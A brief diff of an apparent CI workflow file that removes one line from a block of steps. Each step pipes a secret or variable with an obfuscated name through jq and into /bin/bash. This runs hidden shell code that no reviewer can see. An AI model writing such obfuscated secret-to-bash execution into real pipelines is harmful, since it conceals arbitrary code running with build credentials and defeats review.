@@ -21,7 +21,6 @@ jobs:
           x1: ${{ secrets.x1 }}
         run: |
           printf '%s' "$x1" | jq -r .byooq455 | /bin/bash
-          echo $nbv1 | jq -r .pxsr115 | /bin/bash
           printf '%s' "$kjcjz72" | jq -r .g7181 | /bin/bash
           printf '%s' "$enucj32169" | jq -r .wqsll284 | /bin/bash
           echo $tc18926 | jq -r .rqes12781 | /bin/bash
